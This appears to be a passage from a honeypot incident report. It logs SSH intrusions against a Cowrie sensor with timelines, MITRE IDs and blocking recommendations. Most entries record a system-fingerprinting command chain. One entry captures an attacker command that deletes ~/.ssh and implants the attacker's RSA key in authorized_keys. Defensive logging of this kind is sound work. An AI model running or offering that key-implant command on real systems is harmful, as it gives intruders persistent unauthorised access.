| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:37:56` | `cowrie.session.connect` |
| `2026-09-01 22:37:57` | `cowrie.client.version` |
| `2026-09-01 22:37:57` | `cowrie.client.kex` |
| `2026-09-01 22:38:05` | `cowrie.login.success` |
| `2026-09-01 22:38:07` | `cowrie.session.params` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.success` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.command.input` |
| `2026-09-01 22:38:07` | `cowrie.log.closed` |
| `2026-09-01 22:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-242ca1ebec28

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:39 |
| **Last Seen** | 2026-09-01 22:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:39:25` | `cowrie.session.connect` |
| `2026-09-01 22:39:27` | `cowrie.client.version` |
| `2026-09-01 22:39:27` | `cowrie.client.kex` |
| `2026-09-01 22:39:34` | `cowrie.login.success` |
| `2026-09-01 22:39:36` | `cowrie.session.params` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.success` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.command.input` |
| `2026-09-01 22:39:36` | `cowrie.log.closed` |
| `2026-09-01 22:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37bb6f5d0490

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:40 |
| **Last Seen** | 2026-09-01 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:40:20` | `cowrie.session.connect` |
| `2026-09-01 22:40:20` | `cowrie.client.version` |
| `2026-09-01 22:40:20` | `cowrie.client.kex` |
| `2026-09-01 22:40:21` | `cowrie.login.success` |
| `2026-09-01 22:40:21` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:40:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:40:21` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3124c6a4804d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:40 |
| **Last Seen** | 2026-09-01 22:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:40:55` | `cowrie.session.connect` |
| `2026-09-01 22:40:56` | `cowrie.client.version` |
| `2026-09-01 22:40:56` | `cowrie.client.kex` |
| `2026-09-01 22:41:02` | `cowrie.login.success` |
| `2026-09-01 22:41:04` | `cowrie.session.params` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.success` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.command.input` |
| `2026-09-01 22:41:04` | `cowrie.log.closed` |
| `2026-09-01 22:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e7103afc26

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:42 |
| **Last Seen** | 2026-09-01 22:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:42:22` | `cowrie.session.connect` |
| `2026-09-01 22:42:24` | `cowrie.client.version` |
| `2026-09-01 22:42:24` | `cowrie.client.kex` |
| `2026-09-01 22:42:31` | `cowrie.login.success` |
| `2026-09-01 22:42:34` | `cowrie.session.params` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.success` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.command.input` |
| `2026-09-01 22:42:34` | `cowrie.log.closed` |
| `2026-09-01 22:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f2c19a0393

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 22:43 |
| **Last Seen** | 2026-09-01 22:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:43:25` | `cowrie.session.connect` |
| `2026-09-01 22:43:25` | `cowrie.client.version` |
| `2026-09-01 22:43:25` | `cowrie.client.kex` |
| `2026-09-01 22:43:25` | `cowrie.login.success` |
| `2026-09-01 22:43:25` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:43:25` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d13c964b69

| Field | Detail |
|---|---|
| **Source IP** | `59.15.58[.]148` |
| **First Seen** | 2026-09-01 22:43 |
| **Last Seen** | 2026-09-01 22:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:43:45` | `cowrie.session.connect` |
| `2026-09-01 22:43:45` | `cowrie.client.version` |
| `2026-09-01 22:43:45` | `cowrie.client.kex` |
| `2026-09-01 22:43:46` | `cowrie.login.success` |
| `2026-09-01 22:43:46` | `cowrie.session.params` |
| `2026-09-01 22:43:46` | `cowrie.command.input` |
| `2026-09-01 22:43:46` | `cowrie.command.failed` |
| `2026-09-01 22:43:47` | `cowrie.log.closed` |
| `2026-09-01 22:43:48` | `cowrie.session.params` |
| `2026-09-01 22:43:48` | `cowrie.command.input` |
| `2026-09-01 22:43:48` | `cowrie.session.file_download` |
| `2026-09-01 22:43:48` | `cowrie.log.closed` |
| `2026-09-01 22:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.15.58[.]148` to AbuseIPDB if not already reported
- [ ] Block `59.15.58[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95ca2c0dfbaa

| Field | Detail |
|---|---|
| **Source IP** | `59.15.58[.]148` |
| **First Seen** | 2026-09-01 22:43 |
| **Last Seen** | 2026-09-01 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:43:48` | `cowrie.session.connect` |
| `2026-09-01 22:43:48` | `cowrie.client.version` |
| `2026-09-01 22:43:48` | `cowrie.client.kex` |
| `2026-09-01 22:43:49` | `cowrie.login.success` |
| `2026-09-01 22:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.15.58[.]148` to AbuseIPDB if not already reported
- [ ] Block `59.15.58[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf3b6ae92cb8

| Field | Detail |
|---|---|
| **Source IP** | `59.15.58[.]148` |
| **First Seen** | 2026-09-01 22:43 |
| **Last Seen** | 2026-09-01 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:43:50` | `cowrie.session.connect` |
| `2026-09-01 22:43:50` | `cowrie.client.version` |
| `2026-09-01 22:43:50` | `cowrie.client.kex` |
| `2026-09-01 22:43:51` | `cowrie.login.success` |
| `2026-09-01 22:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.15.58[.]148` to AbuseIPDB if not already reported
- [ ] Block `59.15.58[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abf9c274e789

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:43 |
| **Last Seen** | 2026-09-01 22:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:43:50` | `cowrie.session.connect` |
| `2026-09-01 22:43:52` | `cowrie.client.version` |
| `2026-09-01 22:43:52` | `cowrie.client.kex` |
| `2026-09-01 22:43:58` | `cowrie.login.success` |
| `2026-09-01 22:44:00` | `cowrie.session.params` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.success` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.command.input` |
| `2026-09-01 22:44:00` | `cowrie.log.closed` |
| `2026-09-01 22:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72e21aaa37a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:45 |
| **Last Seen** | 2026-09-01 22:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:45:15` | `cowrie.session.connect` |
| `2026-09-01 22:45:17` | `cowrie.client.version` |
| `2026-09-01 22:45:17` | `cowrie.client.kex` |
| `2026-09-01 22:45:24` | `cowrie.login.success` |
| `2026-09-01 22:45:26` | `cowrie.session.params` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.success` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.command.input` |
| `2026-09-01 22:45:26` | `cowrie.log.closed` |
| `2026-09-01 22:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de06911c2c67

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:46 |
| **Last Seen** | 2026-09-01 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:46:23` | `cowrie.session.connect` |
| `2026-09-01 22:46:23` | `cowrie.client.version` |
| `2026-09-01 22:46:23` | `cowrie.client.kex` |
| `2026-09-01 22:46:24` | `cowrie.login.success` |
| `2026-09-01 22:46:24` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:46:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:46:24` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9881ddc98ef6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:46 |
| **Last Seen** | 2026-09-01 22:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:46:43` | `cowrie.session.connect` |
| `2026-09-01 22:46:45` | `cowrie.client.version` |
| `2026-09-01 22:46:45` | `cowrie.client.kex` |
| `2026-09-01 22:46:52` | `cowrie.login.success` |
| `2026-09-01 22:46:54` | `cowrie.session.params` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.success` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.command.input` |
| `2026-09-01 22:46:54` | `cowrie.log.closed` |
| `2026-09-01 22:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9951380192

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:48 |
| **Last Seen** | 2026-09-01 22:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:48:07` | `cowrie.session.connect` |
| `2026-09-01 22:48:09` | `cowrie.client.version` |
| `2026-09-01 22:48:09` | `cowrie.client.kex` |
| `2026-09-01 22:48:16` | `cowrie.login.success` |
| `2026-09-01 22:48:17` | `cowrie.session.params` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.success` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.command.input` |
| `2026-09-01 22:48:17` | `cowrie.log.closed` |
| `2026-09-01 22:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01af0bc85843

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:49 |
| **Last Seen** | 2026-09-01 22:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:49:30` | `cowrie.session.connect` |
| `2026-09-01 22:49:32` | `cowrie.client.version` |
| `2026-09-01 22:49:32` | `cowrie.client.kex` |
| `2026-09-01 22:49:38` | `cowrie.login.success` |
| `2026-09-01 22:49:40` | `cowrie.session.params` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.success` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.command.input` |
| `2026-09-01 22:49:40` | `cowrie.log.closed` |
